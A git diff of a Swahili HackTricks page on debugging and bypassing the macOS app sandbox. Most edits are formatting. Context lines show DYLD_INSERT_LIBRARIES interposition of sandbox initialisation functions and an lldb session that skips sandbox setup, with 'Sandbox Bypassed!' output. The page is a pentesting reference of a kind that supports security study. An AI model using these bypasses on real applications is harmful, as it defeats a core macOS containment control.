@@ -1,4 +1,4 @@
-# macOS Sandbox Kurekebisha na Kupita
+# macOS Sandbox Debug & Bypass
 
 <details>
 
@@ -9,7 +9,7 @@ Njia nyingine za kusaidia HackTricks:
 * Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -77,18 +77,21 @@ Ikiwa kutoka kwa mchakato wa sandbox unaweza **kuathiri michakato mingine** inay
 [Utafiti huu](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) uligundua njia 2 za kuepuka Sandbox. Kwa sababu sandbox inatumika kutoka kwa userland wakati maktaba ya **libSystem** inapakia. Ikiwa binary inaweza kuepuka kupakia, kamwe haitapata sandbox:
 
 * Ikiwa binary imekamilika **imekusanywa kwa njia ya kustatiki**, inaweza kuepuka kupakia maktaba hiyo.
-* Ikiwa **binary haitahitaji kupakia maktaba yoyote** (kwa sababu linker pia iko katika libSystem), haitahitaji kupakia libSystem.&#x20;
+* Ikiwa **binary haitahitaji kupakia maktaba yoyote** (kwa sababu linker pia iko katika libSystem), haitahitaji kupakia libSystem.
 
 ### Shellcodes
 
 Tafadhali kumbuka kuwa **hata shellcodes** katika ARM64 inahitaji kuunganishwa na `libSystem.dylib`:
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### Haki za Kustahiki
 
 Tafadhali kumbuka kwamba hata kama baadhi ya **vitendo** vinaweza kuruhusiwa na **sandbox**, ikiwa programu ina **haki za kustahiki** maalum, kama vile:
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -98,15 +101,17 @@ Tafadhali kumbuka kwamba hata kama baadhi ya **vitendo** vinaweza kuruhusiwa na 
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### Kupitisha Kizuizi
 
 Kwa habari zaidi kuhusu **Kupitisha Kizuizi**, angalia:
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### Kupitisha `_libsecinit_initializer` ili kuzuia kizuizi cha sanduku
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -130,6 +135,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### Interpost `__mac_syscall` kuzuia Sandbox
 
 {% code title="interpose.c" %}
@@ -165,6 +171,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -176,6 +183,7 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### Kurekebisha na kuzunguka Sanduku na lldb
 
 Tengeneza programu ambayo inapaswa kuwa na sanduku:
@@ -188,7 +196,6 @@ int main() {
 system("cat ~/Desktop/del.txt");
 }
 ```
-{% tab title="entitlements.xml" %}
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -223,19 +230,18 @@ This is an example of an entitlements.xml file used in macOS sandboxing. The ent
 
 In this example, the following entitlements are granted:
 
-- `com.apple.security.app-sandbox`: Enables the application to run in a sandbox.
-- `com.apple.security.network.client`: Allows the application to make network connections.
-- `com.apple.security.files.user-selected.read-write`: Grants read and write access to files selected by the user.
-- `com.apple.security.files.user-selected.read-only`: Grants read-only access to files selected by the user.
-- `com.apple.security.files.downloads.read-write`: Grants read and write access to downloaded files.
-- `com.apple.security.files.downloads.read-only`: Grants read-only access to downloaded files.
-- `com.apple.security.files.all`: Grants access to all files.
-- `com.apple.security.print`: Allows the application to print.
-- `com.apple.security.temporary-exception.apple-events`: Grants temporary exception for Apple events to the specified application (in this case, Xcode).
+* `com.apple.security.app-sandbox`: Enables the application to run in a sandbox.
+* `com.apple.security.network.client`: Allows the application to make network connections.
+* `com.apple.security.files.user-selected.read-write`: Grants read and write access to files selected by the user.
+* `com.apple.security.files.user-selected.read-only`: Grants read-only access to files selected by the user.
+* `com.apple.security.files.downloads.read-write`: Grants read and write access to downloaded files.
+* `com.apple.security.files.downloads.read-only`: Grants read-only access to downloaded files.
+* `com.apple.security.files.all`: Grants access to all files.
+* `com.apple.security.print`: Allows the application to print.
+* `com.apple.security.temporary-exception.apple-events`: Grants temporary exception for Apple events to the specified application (in this case, Xcode).
 
 These entitlements define the boundaries and permissions for the application, ensuring that it operates within the constraints of the sandbox while still allowing necessary functionality.
 
-{% endtab %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
@@ -277,12 +283,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% hint style="danger" %}
 Programu itajaribu **kusoma** faili **`~/Desktop/del.txt`**, ambayo **Sandbox haitaruhusu**.\
 Tengeneza faili hapo kwa sababu mara baada ya kuzidi kizuizi cha Sandbox, itaweza kuisoma:
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 Hebu tafuta hitilafu katika programu ili uone wakati Sanduku la Usalama linapakia:
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -359,6 +367,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **Hata baada ya kusaidiwa na Sanduku, TCC** itamuuliza mtumiaji ikiwa anataka kuruhusu mchakato kusoma faili kutoka kwenye desktop
 {% endhint %}
@@ -378,7 +387,7 @@ Njia nyingine za kusaidia HackTricks:
 * Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
